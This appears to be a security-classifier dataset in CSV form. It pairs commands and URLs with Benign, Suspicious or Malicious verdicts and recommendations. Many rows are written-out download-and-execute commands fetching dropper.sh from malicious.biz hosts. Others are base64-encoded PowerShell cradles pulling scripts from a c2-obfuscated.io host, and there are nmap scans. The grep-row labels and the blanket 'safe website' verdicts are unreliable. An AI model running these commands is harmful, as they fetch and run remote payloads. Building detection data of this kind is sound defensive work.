input_text,target_text
analyze: cp ~/projects/report39.md ~/backups/report39.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage78.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report19.md ~/backups/report19.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: mbd.scout.com/mb.aspx?s=167&f=1386,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage3.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: airlines.priceline.com/airlines/kansas-city-international-airport.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage37.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage12.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage0.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage2.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage20.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: twitter.com/Dana_G,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: livebygreenlake.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage39.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.24","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: top2toebeautysecrets.com/2066/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage72.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage65.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report35.md ~/backups/report35.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: cp ~/projects/report14.md ~/backups/report14.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage60.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.3","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: cp ~/projects/report12.md ~/backups/report12.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: bixi.net/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.34","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.5","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: cp ~/projects/report13.md ~/backups/report13.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage43.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage17.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report4.md ~/backups/report4.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: experiencefestival.com/list_of_american_jewish_comedians,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage27.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: voanews.com/english/news/arts-and-entertainment/music/U2-Tops-Forbes-List-of-Highest-Paid-Musicians-Plot-to-Rob-Murder-Joss-Stone-Foiled-124186509.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: qualityhoteldowntownmontreal.com/nearbyattractions.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage70.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report26.md ~/backups/report26.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage22.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: glendroverband.com/?page_id=8,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage29.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage44.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.4","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: wget http://cdn-stage77.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.20","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: cp ~/projects/report24.md ~/backups/report24.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: cp ~/projects/report2.md ~/backups/report2.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage15.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: sortedbyname.com/pages/r101949.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage46.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage74.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: pitch.com/kansascity/queens-club-strikes-a-deal-with-tooth-and-nail-and-hammers-the-social-media/Content?oid=2196734,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: wget http://cdn-stage50.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report18.md ~/backups/report18.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: cp ~/projects/report23.md ~/backups/report23.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage41.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report5.md ~/backups/report5.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
"analyze: nmap -sS -T4 -p 22,80,443 192.168.1.6","Suspicious - Performs a fast TCP SYN scan on common ports, potentially as part of internal reconnaissance (T1046). Recommendation: Review scan origin and restrict network mapping tools to admins."
analyze: cp ~/projects/report30.md ~/backups/report30.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: wget http://cdn-stage66.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage56.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage67.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: wget http://cdn-stage58.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,"Malicious - Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204). Recommendation: Remove the script, investigate execution logs, and audit /tmp for other payloads."
analyze: cp ~/projects/report16.md ~/backups/report16.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: cp ~/projects/report36.md ~/backups/report36.md.bak,"Benign - Copies a markdown file to a backup location, routine user activity. Recommendation: No action needed."
analyze: grep -ai 'user18' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY4LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzU4NDUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: names.whitepages.com/last/sheridan,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDU4LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzM1ODUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDguYzItb2JmdXNjYXRlZC5pby91cGRhdGVfNTk0MS5wczEnKQ==,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_7.log > ~/logs/archive/session_7.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_3.log > ~/logs/archive/session_3.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_29.log > ~/logs/archive/session_29.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: http://tezrsrc.gov.cn/shownews.asp?sortid=9&typeid=96&id=495&state=show,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://iremshrine.org/component/jevents/day.listevents/2013/02/10/97,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: grep -ai 'user10' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDc2LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzg0MTIucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: stm.info/English/metro/a-m52.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQ4LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzc3NTUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDMxLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzQ0MDAucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_19.log > ~/logs/archive/session_19.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_30.log > ~/logs/archive/session_30.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDE2LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzIxNTUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: linkedin.com/in/robfavreau,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY3LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzY3NDIucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: http://a-sluh.ru/sejeal.jpg,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.real-house.nl/home/169-news-scene/965-the-straight-jackets-a-sam-obernik-love-a-oxygen-.html?tmpl=component&print=1&page=,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: bballone.com/garyp/garypayton.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: gzip -c ~/logs/session_0.log > ~/logs/archive/session_0.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: blockbuster.com/browse/catalog/personDetails/122625,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: lakecharles.craigslist.org/cta/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: grep -ai 'user0' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: grep -ai 'userb' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: grep -ai 'user13' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: gzip -c ~/logs/session_17.log > ~/logs/archive/session_17.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDY2LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzIwMTIucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_27.log > ~/logs/archive/session_27.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_31.log > ~/logs/archive/session_31.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDc4LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzE1NTgucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: gzip -c ~/logs/session_39.log > ~/logs/archive/session_39.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_5.log > ~/logs/archive/session_5.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_21.log > ~/logs/archive/session_21.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDM4LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzM1MjQucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: http://svadebny.com/index.php?option=com_content&view=article&catid=117&id=1263&Itemid=703,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: tvedicion.galeon.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.allaroundrental.com/index.php?option=com_virtuemart&Itemid=48,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDE0LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzcxNTgucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDEwLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzMzMzUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: jenkstrojanfootball.com/2005_recap.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: gzip -c ~/logs/session_12.log > ~/logs/archive/session_12.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_24.log > ~/logs/archive/session_24.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_16.log > ~/logs/archive/session_16.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_25.log > ~/logs/archive/session_25.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: punknews.org/article/39912,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: gzip -c ~/logs/session_1.log > ~/logs/archive/session_1.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_8.log > ~/logs/archive/session_8.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQ5LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzcwNzMucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: worthpoint.com/worthopedia/1933-hamilton-gum-18-sylvio-mantha-psa-7++-should-be,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: gzip -c ~/logs/session_28.log > ~/logs/archive/session_28.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_20.log > ~/logs/archive/session_20.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: gzip -c ~/logs/session_32.log > ~/logs/archive/session_32.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: booking.com/hotel/ae/grand-midwest-suites.en.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDQ3LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzk0MjcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user26' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: fortwayne.com/apps/pbcs.dll/article?AID=/SE/20110820/NEWS/108200321,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDEzLmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzUyODUucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: grep -ai 'user16' /var/log/auth.log,"Suspicious - Searches authentication logs for hex-encoded or obfuscated usernames, may indicate log tampering or access checking. Recommendation: Investigate user and correlate with system access events."
analyze: gzip -c ~/logs/session_9.log > ~/logs/archive/session_9.log.gz,Benign - Compresses logs into an archive for safe storage — routine admin operation. Recommendation: No action needed.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDc5LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzY3NzcucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
analyze: powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9kbDI3LmMyLW9iZnVzY2F0ZWQuaW8vdXBkYXRlXzI5MDgucHMxJyk=,Malicious - Base64-encoded PowerShell command using dynamic filenames to evade signature-based detection. Recommendation: Decode and inspect execution context; restrict encoded script use unless signed and verified.
